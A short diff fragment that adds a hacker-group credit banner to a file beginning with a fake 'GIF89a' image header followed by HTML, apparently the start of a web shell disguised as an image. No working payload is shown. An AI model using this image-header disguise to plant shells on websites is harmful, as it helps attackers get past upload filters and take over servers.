@@ -1,3 +1,11 @@
+#################################################
+#           reCoded by: Jakarta6etar            #
+#          Team: Eldersc0de Securi7y            #
+#         https://fb.com/jakarta.exploded.12    #
+#-----------------------------------------------#
+#     Thank's To IndoXploit & Xai Syndicate     #
+#################################################
+
 GIF89a;
 <html>
 <body bgcolor="white">
